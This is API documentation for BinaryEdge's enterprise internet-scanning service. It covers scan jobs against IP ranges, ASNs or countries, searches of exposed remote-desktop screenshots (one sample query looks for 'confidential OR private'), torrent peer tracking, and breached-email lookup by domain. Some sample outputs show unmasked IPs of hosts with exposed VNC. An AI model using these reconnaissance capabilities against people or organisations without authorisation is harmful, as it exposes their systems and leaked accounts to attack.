# API V1 - Enterprise - Documentation

- - -

    API V1 - Enterprise Accounts only.
    
    To get access, please get in touch with <info@binaryedge.io>.
    
    If you are using app.binaryedge.io -> Use API V2

- - -

**Base URL** : https://api.binaryedge.io/v1/

**Key Header** : X-Token

```shell
curl 'https://api.binaryedge.io/v1/<endpoint>' -H 'X-Token:API_TOKEN'
```

## Swagger Definition

You can download the Swagger OpenApi specification file : [v1.yaml](/swagger/v1.yaml). You can use this with Postman or any other client tool.


## How to use BinaryEdge’s API

<p align="center"><img src ="https://dl.dropboxusercontent.com/s/sgwwkchh59nrhgk/how_to_use_api_2.png?dl=0" /></p>

Note: all requests are identified by Job ID and are shown in the stream window.


|   | Input                                                                                                                                                                                                                                                                                                   | Output                                                    |
|---|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------|
| 1 | Connect to Data Stream <br> `curl 'https://stream.api.binaryedge.io/v1/stream' -H 'X-Token:API_TOKEN' `                                                                                                                                                                                                                                     | (data stream)                                             |
| 2 | Request a Scan Task <br> `curl 'https://api.binaryedge.io/v1/tasks' -d '{"type":"scan", "description": "InsertYourDescriptionHere", "options":[{"targets":["InsertIPAddress/IPNetwork/ASN/CountryCode"], "ports":[{"port":"InsertPort/PortRange", "protocol": "tcp/udp", "modules": ["InsertModule"], "config": {"InsertConfigKey", "InsertConfigValue"}, "sample": "InsertSampleSize"}]}]}' -v -H 'X-Token:API_TOKEN'` | {"stream_url":"stream URL", "job_id":"Job ID"}             |


## Index

* [Data Stream](#data-stream)
    * [1. firehose](#1-firehose)
    * [2. stream](#2-stream)
    * [3. torrent](#3-torrent)
    * [4. sinkhole](#4-sinkhole)

* [Tasks](#tasks)
    * [GET /v1/tasks - List Requested Jobs](#get-v1tasks-list-requested-jobs)
    * [POST /v1/tasks - Create Job](#post-v1tasks-create-job)
    * [GET /v1/tasks/job_id/stats - Job Stats](#get-v1tasksjob_idstats-job-stats)
    * [POST /v1/tasks/job_id/revoke - Job Revoke](#post-v1tasksjob_idrevoke-job-revoke)
    * [GET /v1/replay/job_id - Replay Job](#get-v1replayjob_id-replay-job)

* [Job Status](#job-status)

* [Supported Types](#supported-job-types)
    * [1. scan](#1-scan)
    * [2. grab](#2-grab)

* [Supported Modules](#supported-modules-types)
    * [Custom Modules](#custom-modules)

* [Configurations](#configurations)
    * [Available configurations](#available-configurations)

* [Query Endpoints](#query-endpoints)
    * [Host](#host)
        * [/v1/query/historical/{target}](#v1queryhistoricaltarget)
        * [/v1/query/latest/{target}](#v1querylatesttarget)
        * [/v1/query/search](#v1querysearch)
        * [/v1/query/search/stats](#v1querysearchstats)

    * [Image](#image)
        * [/v1/query/image/ip/{target}](#v1queryimageiptarget)
        * [/v1/query/image](#v1queryimage)
        * [/v1/query/image/{image_id}](#v1queryimageimage_id)
        * [/v1/query/image/search](#v1queryimagesearch)
        * [/v1/query/image/search/stats](#v1queryimagesearchstats)
        * [/v1/query/image/search/similar](#v1queryimagesearchsimilar)

    * [Torrent](#torrent)
        * [/v1/query/torrent/historical/{target}](#v1querytorrenthistoricaltarget)
        * [/v1/query/torrent/latest/{target}](#v1querytorrentlatesttarget)
        * [/v1/query/torrent/search](#v1querytorrentsearch)
        * [/v1/query/torrent/search/stats](#v1querytorrentsearchstats)

    * [Dataleaks](#dataleaks)
        * [/v1/dataleaks/check/{email}](#get-v1dataleakscheckemail)
        * [/v1/dataleaks/organization/{domain}](#get-v1dataleaksorganizationdomain)
        * [/v1/dataleaks/leaks](#get-v1dataleaksleaks)

    * [Risk Score](#risk-score)
        * [/v1/query/score/ip/{target}](#v1queryscoreiptarget)
        * [/v1/query/cve/ip/{target}](#v1querycveiptarget)

    * [Domains](#domains)
        * [/v1/query/domains/subdomain/{target}](#v1querydomainssubdomaintarget)
        * [/v1/query/domains/dns/{target}](#v1querydomainsdnstarget)
        * [/v1/query/domains/ip/{target}](#v1querydomainsiptarget)
        * [/v1/query/domains/search](#v1querydomainssearch)
        * [/v1/query/domains/enumeration](#v1querydomainsenumeration)
        * [/v1/query/domains/homoglyphs](#v1querydomainshomoglyphs)
    * [Sensors](#sensors)
        * [/v1/query/sensors/ip/{target}](#v1querysensorsiptarget)
        * [/v1/query/sensors/search](#v1querysensorssearch)
        * [/v1/query/sensors/search/stats](#v1querysensorssearchstats)


## Data Stream

Continuous Data Stream of events generated by our platform.

```
Important: The Stream might disconnect sometimes, as such, it is the client's responsibility to reconnect, as it might miss results while disconnected. However, no data is really lost, since there is always the possibility of replay.
```

There are 2 types of Data Streams available that can be consumed, based on your client account permissions.

#### 1. Firehose

_Endpoint_: https://stream.api.binaryedge.io/v1/firehose

_Description_: This stream contains all data generated by Binaryedge own scans. These include the continuous WorldWide Scans that target different ports every day. This stream does not contain data generated from jobs requested by clients.

#### 2. Stream

_Endpoint_: https://stream.api.binaryedge.io/v1/stream

_Description_: This stream contains all data generated by your own requested Jobs. Clients don't have access to data generated from scans of other clients.

#### 3. Torrent

_Endpoint_: https://stream.api.binaryedge.io/v1/torrent

_Description_: This stream contains data generated by our listeners on the DHT, which is a series of events referring to "who is downloading what from whom".

See [Torrent Data](torrent.md) for details.

#### 4. Sinkhole

_Endpoint_: https://stream.api.binaryedge.io/v1/sinkhole

_Description_: This stream contains data generated by our "listen-only" machines, i.e., what everyone else has been scanning on our machines.

See [Sensor Data](sensors.md) for details.

## Tasks

### GET /v1/tasks - List Requested Jobs

Retrieve a list of the latest requested jobs. This includes:

* "description": Description of the job, as specified on the request;
* "status": Status of the job. Where status can be:
    * "requested": Job was requested successfully;
    * "revoked": Job was revoked by user;
    * "success": Job completed successfully;
    * "failed": Job completed, but did not finish.
* "requested_at": Time the job was requested;
* "finished_at": Time the job finished;
* "job_id": ID of the requested job;
* "options": Job configuration options.

```shell
curl 'https://api.binaryedge.io/v1/tasks' -H 'X-Token:API_TOKEN'

HTTP/1.1 200 OK

[{"status": "Success", "requested_at": "2017-04-10T17:44:58.636681+00:00", "description": "Job Description 1", "finished_at": "2017-04-10T17:47:46.534544+00:00", "options": [{"targets": ["xxx.xxx.xxx.xxx"], "ports": [{"modules": ["service", "service-simple", "ssh"], "port": "80,8080"}]}], "job_id": "32637b98-8f01-46eb-a1f7-3eaee18ab1d5"}, {"status": "Success", "requested_at": "2017-04-10T17:39:53.066632+00:00", "description": "Test web", "finished_at": "2017-04-10T17:41:57.919141+00:00", "options": [{"targets": ["example.org"], "ports": [{"config": {"https": true}, "modules": ["web"], "port": 443}]}], "job_id": "73364d62-d768-4dbd-9947-aba2a453dfb7"}]
```

### POST /v1/tasks - Create Job

Create a On-Demand Job. You can specify your own targets, ports, modules and configurations.

Parameters:

* "type": "scan" or "grab". Please refer to [Supported Job Types](#supported-job-types);
* "description": Add your own description of the job. Can be a empty string, i.e. "";
* "options": Configuration Options for the job, array of JSON objects. One Job can have multiple options.

```shell
curl 'https://api.binaryedge.io/v1/tasks' -d '{"type":"scan", "description": "InsertYourDescriptionHere", "options":[{"targets":["InsertIPAddress/IPNetwork/ASN/CountryCode"], "ports":[{"port":"InsertPort/PortRange", "protocol": "tcp/udp", "modules": ["InsertModule"]}]}]}' -H 'X-Token:API_TOKEN'
```

### GET /v1/tasks/job_id/stats - Job Stats

Retrieve statistics about a previously requested scan job. This includes:

* "status": Status of the job. Where status can be:
    * "requested": Job was requested successfully;
    * "revoked": Job was revoked by user;
    * "success": Job completed successfully;
    * "failed": Job completed, but did not finish.
* "number_results": Number of events returned.
* "open_ports": Number of open ports detected.
* "ports": List of open ports detected.
* "targets": Number of targets that responded.
* "grabbers": Grabber specific statistics.
    * "type": Grabber type.
    * "port": Port number.
    * "count": Number of events for a specific grabber type and port number.

```shell
curl 'https://api.binaryedge.io/v1/tasks/<JOB_ID>/stats' -H 'X-Token:API_TOKEN'

HTTP/1.1 200 OK
{"stats":"<STATS>"}
```

### POST /v1/tasks/job_id/revoke - Job Revoke

To cancel a requested job:

```shell
curl -XPOST 'https://api.binaryedge.io/v1/tasks/<JOB_ID>/revoke' -H  'X-Token:API_TOKEN'

HTTP/1.1 200 OK
{"message": "Job revoked"}
```

### GET /v1/replay/job_id - Replay Job

To retrieve the results from a previously requested scan job, you can replay the stream with this endpoint.

```shell
curl 'https://stream.api.binaryedge.io/v1/replay/<JOB_ID>' -H 'X-Token:API_TOKEN'

HTTP/1.1 200 OK
<Stream results from request job>
```

### Job Status

In order for you to know the status of your jobs we provide information in 2 distinct ways:

#### 1. GET /v1/tasks/job_id/status - Status Endpoint

To check the current status of a Requested job:

```shell
curl 'https://api.binaryedge.io/v1/tasks/<JOB_ID>/status' -H 'X-Token:API_TOKEN'

HTTP/1.1 200 OK
{"status":"<STATUS>"}
```

Where Status can be:

* "requested": Job was requested successfully;
* "revoked": Job was revoked by user;
* "success": Job completed successfully;
* "failed": Job completed, but did not finish.

#### 2. Status Messages inside stream

In your stream you will find messages providing insight on the current status of your jobs:

**Job Created**

```json
{
  "origin": {
    "job_id": "c4773cb-aa1e-4356eac1ad08",
    "type": "job_status"
  },
  "status": {
    "success": null,
    "started": null,
    "completed": null,
    "revoked": null
  }
}
```

**Job Completed**

```json
{
  "origin": {
    "job_id": "c4773cb-aa1e-4356eac1ad08",
    "type": "job_status"
  },
  "status": {
    "success": true,
    "started": true,
    "completed": true,
    "revoked": false
  }
}
```

Meaning of the status fields:

  * "success": If the job was completed successfully, with no problems;
  * "started": When a job is requested, it is put into a queue;
  * "completed": If the job is completed, no more results will be sent;
  * "revoked": If the job was canceled by the user or not.


### Supported Job Types

There are 2 types of requests.

### 1. scan
The scan type will request a portscan on the targets and will launch the modules against the detected open ports only. It can be used against any number of targets. 

It's highly recommended to use if there is a large number of targets, this way it filters responding IPs before launching modules, which can speed up a job greatly.

Scanning supports both IP addresses and domains, but since portscan will resolve domains and use their IP addresses, some domains' results might only obtainable if you use the _grab_ type directly on them.

### 2. grab
The grab type will try to gather information directly from the targets, without portscanning first. Should only be used against a small number of targets, since it will launch the modules against all targets without and filtering first.

Recommended mostly for when targeting domains, for instance with HTTP/HTTPS, Web or SSL modules. 

## Supported Modules Types

See [List of Modules](modules.md) for a list of all available modules and their descriptions.

### Custom Modules
Note: If you want a custom-made module, please contact BinaryEdge.

## Configurations
It is possible to set module specific configurations on the job requests. For example, the HTTP module allows the configuration of the Host and the User Agent HTTP headers.
The configuration should be set in the "config" key at the same JSON level of the requested modules.

Example:

```json
{
  "type": "scan",
  "description": "test a bunch of networks",
  "options": [
    {
      "targets": ["xxx.xxx.x.x/xx","xxx.xxx.x.x/xx"],
      "ports": [{
        "port": 80,
        "modules": ["http"],
        "config":
          {
            "user_agent":"Test user Agent",
            "host_header":"google.com"
          }
      }]
    }
  ]
}
```

### Available configurations

Check each module's detailed documentation for the available configurations. See [List of Modules](modules.md).


## Query Endpoints

### Host

#### /v1/query/historical/{target}

Details about an Host, with data up to 6 months.

List of events for the specified host, with events for each time that:

- A port was detected open
- A service was found running
- Other modules were successfully executed 

*Parameters*

* target: [String] Target IP address or CIDR up to /24

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/historical/222.208.xxx.xxx' -H 'X-Token:API_TOKEN'
```

```json
{
  "origin": {
    "country": "uk",
    "module": "grabber",
    "ts": 1464558594512,
    "type": "service-simple"
  },
  "target": {
    "ip": "222.208.xxx.xxx",
    "protocol": "tcp",
    "port": 992
  },
  "result": {
    "data": {
      "state": {
        "state": "open|filtered"
      },
      "service": {
        "name": "telnets",
        "method": "table_default"
      }
    }
  }
}
```

#### /v1/query/latest/{target}

Details about an Host. List of recent events for the specified host, including details of exposed ports and services.

*Parameters*

* target: [String] Target IP address or CIDR up to /24

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/latest/222.208.xxx.xxx' -H 'X-Token:API_TOKEN'
```

```json
{
  "origin": {
    "country": "uk",
    "module": "grabber",
    "ts": 1464558594512,
    "type": "service-simple"
  },
  "target": {
    "ip": "222.208.xxx.xxx",
    "protocol": "tcp",
    "port": 992
  },
  "result": {
    "data": {
      "state": {
        "state": "open|filtered"
      },
      "service": {
        "name": "telnets",
        "method": "table_default"
      }
    }
  }
}
```

#### /v1/query/search

Events based on a Query. Stream of recent events for the given query, including details of exposed ports and services. Can be used with specific parameters and/or full-text search.

*Parameters*

* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](search.md) for details on what parameters can be used.
* only_ips: [Int] Optional. If _only\_ips=1_, only output IP addresses, ports and protocols. 
    * Default: _only\_ips=0_

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/search?query=product:mysql%20AND%20country:ES' -H 'X-Token:API_TOKEN'
```

```json
{
  "origin": {
    "type": "service-simple", 
    "ts": 1552128473582, 
    "module": "grabber", 
    "port": 37188, 
    "country": "uk", 
    "ip": "xxx.xxx.xxx.xxx"
  }, 
  "target": {
    "ip": "xxx.xxx.xxx.xxx", 
    "protocol": "tcp", 
    "port": 9100
  }, 
  "result": {
    "data": {
      "state": {
        "state": "open"
      }, 
      "service": {
        "version": "5.0.45-community-nt", 
        "cpe": ["cpe:/a:mysql:mysql:5.0.45-community-nt"], 
        "name": "mysql", 
        "banner": "A\\x00\\x00\\x00\\n5.0.45-community-nt\\x00\\xe0\\x14\\x00\\x00jEZrR\"QS\\x00,\\xa2\\x08\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00/,0Msz,gFdFr\\x00", 
        "method": "probe_matching", 
        "product": "MySQL"
      }
    }
  }
}
```

#### /v1/query/search/stats 

Statistics of recent events for the given query. Can be used with specific parameters and/or full-text search.

*Parameters*

* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](search.md) for details on what parameters can be used.
* type: [String] Type of statistic we want to obtain. Possible types include:
    * _ports_, _products_, _versions_, _tags_, _services_, _countries_, _asn_.
* order: [String] Optional. Whether to sort descendently or ascendently to get the top.
    * _desc_, _asc_
    * Default: _order=desc_

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/search/stats?query=product:mysql%20AND%20country:ES&type=ports' -H 'X-Key:API_TOKEN'
```

```json
[
  {
    "key": "3306/tcp", 
    "doc_count": 42761
  }, 
  {
    "key": "102/tcp", 
    "doc_count": 5
  }, 
  {
    "key": "1234/tcp", 
    "doc_count": 5
  }, 
  {
    "key": "1911/tcp", 
    "doc_count": 5
  }, 
  {
    "key": "5001/tcp", 
    "doc_count": 5
  }
]
```


### Image

#### /v1/query/image/ip/{target}

Details about Remote Desktops found on an Host. List of screenshots and details extracted from them for the specified host, with data up to 2 months. This includes the following information:

* ip: [string] target address where the screenshot was taken
* port: [int] target port where the service was running
* ts: [int] timestamp of when the screenshot was taken
* geoip: [object] geographical information
    * city_name: [string] city name of the target
    * country_name: [string] country name of the target
    * country_code: [string] 2-letter country code of the target
* asn: [int] AS number of the target
* as_name: [string] AS name of the target
* has_faces: [boolean] whether faces were detected or not
* n_faces: [int] number of faces detected on the image
* tags: [string] tags automatically attributed when processing
* height: [int]
* width: [int]
* url: [string] URL to download image
* thumb: [string] URL to download image thumbnail

*Parameters*

* target: [String] Target IP address or CIDR up to /24
* ocr: [any] Optional. If _ocr=1_, shows an additional "words" field, which is a list of words obtained via OCR
    * Default: _ocr=0_
* page: [Int] Optional. Results page number.
    * Default: _page=1_
* pagesize: [Int] Optional. Results page size.
    * Default: _pagesize=100_

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/image/ip/XXX.XXX.XXX.XXX?ocr=1' -H 'X-Token:API_TOKEN'
```

```json
{
  "total_records": 3,
  "page": 1,
  "events": [
    {
      "image_id": "993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df",
      "asn": 5432,
      "url": "https://d1ngxp4ef6grqi.cloudfront.net/993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df.jpg",
      "width": 1280,
      "as_name": "Proximus NV",
      "thumb": "https://d3f9qnon04ymh2.cloudfront.net/993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df.jpg",
      "geoip": {
        "country_code": "BE",
        "city_name": null,
        "timezone": "Europe/Brussels",
        "longitude": 4.35,
        "country_name": "Belgium",
        "latitude": 50.85,
        "location": [
          4.35,
          50.85
        ]
      },
      "tags": [
        "VNC"
      ],
      "height": 800,
      "port": 5900,
      "country": "BE",
      "ip": "81.246.69.245",
      "ts": 1536345753000
    }
  ]
}
```

#### /v1/query/image

List of Remote Desktops found (latest first).

*Parameters*

* page: [Int] Optional. Results page number.
    * Default: _page=1_
* pagesize: [Int] Optional. Results page size.
    * Default: _pagesize=100_

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/image' -H 'X-Token:API_TOKEN'
```

```json
{
  "total_records": 3,
  "page": 1,
  "events": [
    {
      "url": "https://d1ngxp4ef6grqi.cloudfront.net/9034b457b18ddbe236915407063215f201e214c24cb11a3c6287ae58dd24.jpg",
      "thumb": "https://d3f9qnon04ymh2.cloudfront.net/9034b457b18ddbe236915407063215f201e214c24cb11a3c6287ae58dd24.jpg",
      "image_id": "9034b457b18ddbe236915407063215f201e214c24cb11a3c6287ae58dd24"
    },
    {
      "url": "https://d1ngxp4ef6grqi.cloudfront.net/9035b057b197dcfe338f5a1e08381cf90a851da945b6163b618bae52.jpg",
      "thumb": "https://d3f9qnon04ymh2.cloudfront.net/9035b057b197dcfe338f5a1e08381cf90a851da945b6163b618bae52.jpg",
      "image_id": "9035b057b197dcfe338f5a1e08381cf90a851da945b6163b618bae52"
    },
    {
      "url": "https://d1ngxp4ef6grqi.cloudfront.net/903db057b788c0f929935f1b08381cf90a851da945b6163b618bab56.jpg",
      "thumb": "https://d3f9qnon04ymh2.cloudfront.net/903db057b788c0f929935f1b08381cf90a851da945b6163b618bab56.jpg",
      "image_id": "903db057b788c0f929935f1b08381cf90a851da945b6163b618bab56"
    }
  ]
}
```

#### /v1/query/image/{image_id}

Details about a specific Remote Desktop. This includes the following information:

* ip: [string] target address where the screenshot was taken
* port: [int] target port where the service was running
* ts: [int] timestamp of when the screenshot was taken
* geoip: [object] geographical information
    * city_name: [string] city name of the target
    * country_name: [string] country name of the target
    * country_code: [string] 2-letter country code of the target
* asn: [int] AS number of the target
* as_name: [string] AS name of the target
* has_faces: [boolean] whether faces were detected or not
* n_faces: [int] number of faces detected on the image
* tags: [string] tags automatically attributed when processing
* height: [int]
* width: [int]
* url: [string] URL to download image
* thumb: [string] URL to download image thumbnail

*Parameters*

* image_id: [string] Image ID of the image you want the details from
* ocr: [any] Optional. If _ocr=1_, shows an additional "words" field, which is a list of words obtained via OCR
    * Default: _ocr=0_

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/image/f1b0a311af803ea73ac48adce2378f58adce2378f5?ocr=1' -H 'X-Token:API_TOKEN'
```

```json
{
  "image_id": "993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df",
  "asn": 5432,
  "url": "https://d1ngxp4ef6grqi.cloudfront.net/993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df.jpg",
  "width": 1280,
  "as_name": "Proximus NV",
  "thumb": "https://d3f9qnon04ymh2.cloudfront.net/993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df.jpg",
  "geoip": {
    "country_code": "BE",
    "city_name": null,
    "timezone": "Europe/Brussels",
    "longitude": 4.35,
    "country_name": "Belgium",
    "latitude": 50.85,
    "location": [
      4.35,
      50.85
    ]
  },
  "tags": [
    "VNC"
  ],
  "height": 800,
  "port": 5900,
  "country": "BE",
  "ip": "81.246.69.245",
  "ts": 1536345753000
}
```

#### /v1/query/image/search

List of Remote Desktops based on a Query. Can be used with specific parameters and/or full-text search.

*Parameters*

* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](image-search.md) for details on what parameters can be used.
* page: [Int] Optional. Results page number.
    * Default: _page=1_
* pagesize: [Int] Optional. Results page size.
    * Default: _pagesize=100_

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/image/search?ip=120.XXX.XXX.XXX'  -H 'X-Token:API_TOKEN'
```

```json
{
  "total_records": 3,
  "page": 1,
  "query": {
    "ip": "58.56.83.212",
    "port": 5900,
    "country": "CN",
    "face": true,
    "tag": "vnc",
    "logo": "windows",
    "word": "confidential OR private"
  },
  "events": [
    {
      "url": "https://d1ngxp4ef6grqi.cloudfront.net/903cb557b597d9fa29905e1908381cf90b851da945b711366686af50.jpg",
      "thumb": "https://d3f9qnon04ymh2.cloudfront.net/903cb557b597d9fa29905e1908381cf90b851da945b711366686af50.jpg",
      "image_id": "903cb557b597d9fa29905e1908381cf90b851da945b711366686af50"
    },
    {
      "url": "https://d1ngxp4ef6grqi.cloudfront.net/933db157b280dfe236975e07073315f201e215c24cb11a3d658ba054dd21.jpg",
      "thumb": "https://d3f9qnon04ymh2.cloudfront.net/933db157b280dfe236975e07073315f201e215c24cb11a3d658ba054dd21.jpg",
      "image_id": "933db157b280dfe236975e07073315f201e215c24cb11a3d658ba054dd21"
    },
    {
      "url": "https://d1ngxp4ef6grqi.cloudfront.net/9735ad48b289c0f9338f5c1908381cf90b851da945b712386387ac59.jpg",
      "thumb": "https://d3f9qnon04ymh2.cloudfront.net/9735ad48b289c0f9338f5c1908381cf90b851da945b712386387ac59.jpg",
      "image_id": "9735ad48b289c0f9338f5c1908381cf90b851da945b712386387ac59"
    }
  ]
}
```

#### /v1/query/image/search/stats 

Statistics of recent events for the given query. Can be used with specific parameters and/or full-text search.

*Parameters*

* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](image-search.md) for details on what parameters can be used.
* type: [String] Type of statistic we want to obtain. Possible types include:
    * _ports_, _words_, _tags_, _countries_, _asn_, _rdns_.
* order: [String] Optional. Whether to sort descendently or ascendently to get the top.
    * _desc_, _asc_
    * Default: _order=desc_

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/image/search/stats?query=tags:rdp%20AND%20country:ES&type=ports' -H 'X-Key:API_TOKEN'
```

```json
[
  {
    "key": "3389/tcp", 
    "doc_count": 161165
  }, 
  {
    "key": "3388/tcp", 
    "doc_count": 4755
  }, 
  {
    "key": "80/tcp", 
    "doc_count": 122
  }, 
  {
    "key": "3386/tcp", 
    "doc_count": 121
  }, 
  {
    "key": "443/tcp", 
    "doc_count": 109
  }
]
```

#### /v1/query/image/search/similar

List of Remote Desktops that are similar to another Remote Desktop.
Note: This option cannot be used together with the previous ones.

*Parameters*

* similar: Image ID of the image you wish to compare

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/image/search/similar?similar=f1b0a311af803ea73ac48adce2378f58adce2378f5' -H 'X-Token:API_TOKEN'
```

```json
{
  "total_records": 3,
  "page": 1,
  "events": [
    {
      "url": "https://d1ngxp4ef6grqi.cloudfront.net/9538ad4ab697d6e236935913013817f96deb18aa45b11a3d638aab.jpg",
      "thumb": "https://d3f9qnon04ymh2.cloudfront.net/9538ad4ab697d6e236935913013817f96deb18aa45b11a3d638aab.jpg",
      "score": 26.099752,
      "image_id": "9538ad4ab697d6e236935913013817f96deb18aa45b11a3d638aab",
      "dist": 0
    },
    {
      "url": "https://d1ngxp4ef6grqi.cloudfront.net/9538ad4ab697d6e236935e13013817f96deb18aa4abd133f638ba8.jpg",
      "thumb": "https://d3f9qnon04ymh2.cloudfront.net/9538ad4ab697d6e236935e13013817f96deb18aa4abd133f638ba8.jpg",
      "score": 26.01995,
      "image_id": "9538ad4ab697d6e236935e13013817f96deb18aa4abd133f638ba8",
      "dist": 0
    },
    {
      "url": "https://d1ngxp4ef6grqi.cloudfront.net/9538ad4ab697d6e236935c13013817f96deb18aa4ab2143c6087a9.jpg",
      "thumb": "https://d3f9qnon04ymh2.cloudfront.net/9538ad4ab697d6e236935c13013817f96deb18aa4ab2143c6087a9.jpg",
      "score": 26.01995,
      "image_id": "9538ad4ab697d6e236935c13013817f96deb18aa4ab2143c6087a9",
      "dist": 0
    }
  ]
}
```


### Torrent

#### /v1/query/torrent/historical/{target}

Details about torrents transferred by an Host, with data up to 6 months.

List of torrent events for the specified host, with events for each time that a new transfer was detected on the DHT. See [Torrent Data](torrent.md) for more details.

*Parameters*

* target: [String] Target IP address or CIDR up to /24

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/torrent/222.208.xxx.xxx' -H 'X-Token:API_TOKEN'
```

```json
{
  "origin":{  
    "type":"peer",
    "module":"torrent",
    "ts":1491827676263
  },
  "node":{  
    "ip":"219.88.xxx.xxx",
    "port":25923
  },
  "peer":{  
    "ip":"222.208.xxx.xxx",
    "port":30236
  },
  "torrent":{  
    "infohash":"cbe45addbb48c07ef6451bd3bee326d5cd82538f",
    "name":"NCIS Los Angeles S08E20 HDTV x264-LOL EZTV",
    "source":"EZTV",
    "category":"TV Show"
  }
}
```

#### /v1/query/torrent/latest/{target}

Details about torrents transferred by an Host. List of recent torrent events for the specified host, including details of the peer and torrent. See [Torrent Data](torrent.md) for more details.

*Parameters*

* target: [String] Target IP address or CIDR up to /24

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/torrent/latest/222.208.xxx.xxx' -H 'X-Token:API_TOKEN'
```

```json
{
  "origin":{  
    "type":"peer",
    "module":"torrent",
    "ts":1491827676263
  },
  "node":{  
    "ip":"219.88.xxx.xxx",
    "port":25923
  },
  "peer":{  
    "ip":"222.208.xxx.xxx",
    "port":30236
  },
  "torrent":{  
    "infohash":"cbe45addbb48c07ef6451bd3bee326d5cd82538f",
    "name":"NCIS Los Angeles S08E20 HDTV x264-LOL EZTV",
    "source":"EZTV",
    "category":"TV Show"
  }
}
```

#### /v1/query/torrent/search

Events based on a Query. List of recent events for the given query, including details of the peer and torrent. Can be used with specific parameters and/or full-text search.

*Parameters*

* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](torrents-search.md) for details on what parameters can be used.
* page: [Int] Optional. Results page number.
    * Default: _page=1_
* pagesize: [Int] Optional. Results page size.
    * Default: _pagesize=100_

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/torrent/search?query=category:video' -H 'X-Key:API_TOKEN'
```

```json
{
  "query":"category:video",
  "page":1,
  "pagesize":20,
  "total":3149612,
  "events":[
    {
      "origin":{
        "type":"peer",
        "module":"torrent",
        "ts":1565166671255
      },
      "node":{
        "ip":"xxx.xxx.xxx.xxx",
        "port":2949
      },
      "peer":{
        "ip":"xxx.xxx.xxx.xxx",
        "port":6881
      },
      "torrent":{
        "infohash":"d5380fcda66b48fb8b521d5c3b5e61b91c94775e",
        "name":"Britain's Best Back Gardens Series",
        "source":"ThePirateBay",
        "category":"Video",
        "subcategory":"TV shows"
      }
    },
    {
      "origin":{
        "type":"peer",
        "module":"torrent",
        "ts":1565166671242
      },
      "node":{
        "ip":"xxx.xxx.xxx.xxx",
        "port":8999
      },
      "peer":{
        "ip":"xxx.xxx.xxx.xxx",
        "port":24279
      },
      "torrent":{
        "infohash":"d5380fcda66b48fb8b521d5c3b5e61b91c94775e",
        "name":"Britain's Best Back Gardens Series",
        "source":"ThePirateBay",
        "category":"Video",
        "subcategory":"TV shows"
      }
    }
  ]
}
```

#### /v1/query/torrent/search/stats

Statistics of events for the given query. Can be used with specific parameters and/or full-text search.

*Parameters*

* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](torrents-search.md) for details on what parameters can be used.
* type: [String] Type of statistic we want to obtain. Possible types include:
    * _ports_, _countries_, _asn_, _ips_, _rdns_, _categories_, _names_.
* days: [Integer] Optional. Number of days to get the stats for. For example, days=1 for the last day of data.
    * Default: _days=90_
    * Max: _days=90_
* order: [String] Optional. Whether to sort descendently or ascendently to get the top.
    * _desc_, _asc_
    * Default: _order=desc_

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/torrent/search/stats?query=category:video&type=ports' -H 'X-Key:API_TOKEN'
```

```json
[
  {
    "key":1,
    "doc_count":168056
  },
  {
    "key":8999,
    "doc_count":133738
  },
  {
    "key":6881,
    "doc_count":91512
  },
  {
    "key":51413,
    "doc_count":58998
  },
  {
    "key":1200,
    "doc_count":35127
  }
]
```


### Dataleaks

Allows you to search across multiple data breaches to see if any of your email addresses has been compromised. If you are affected, we recommend you change your password on the respective services.

#### /v1/dataleaks/check/{email}

Verify how many dataleaks affected an specific email address.

*Parameters*

* email: [String] Verify which dataleaks affect the target email.

*Output*

```shell
curl 'https://api.binaryedge.io/v1/dataleaks/check/user@example.com' -H 'X-Token:API_TOKEN'
```

```json
{
  "total_records":19,
  "events":[
    "antipublic",
    "ashleymadison",
    "breachcompilation",
    "cannabis",
    "customerslive",
    "dropbox",
    "exploitin",
    "fling",
    "imesh",
    "lastfm",
    "linkedin",
    "mate1",
    "neopets",
    "pastebin",
    "rsboards",
    "tianya",
    "torrentinvites",
    "tumblr",
    "vk"
  ]
}
```

#### /v1/dataleaks/organization/{domain}

Verify how many emails are affected by dataleaks for a specific domain.

*Parameters*

* domain: [String] Verify which dataleaks affect the target domain
* csv: [any] Optional. If _csv=1_, return results in CSV format
    * Default: _csv=0_
* jsonl: [any] Optional. If _jsonl=1_, return results in JSON lines format
    * Default: _jsonl=0_
* page: [Int] Optional. Results page number.
    * Default: _page=1_
* pagesize: [Int] Optional. Results page size.
    * Default: _pagesize=100_

*Output*

```shell
curl 'https://api.binaryedge.io/v1/dataleaks/organization/example.com' -H 'X-Token:API_TOKEN'
```

```json
{
  "events": [
    {
      "user": "user",
      "leak": "ashleymadison"
    }
  ],
  "total_records": 1
}
```

#### /v1/dataleaks/leaks

Get all available information about the dataleaks our platform keeps track.

*Parameters*

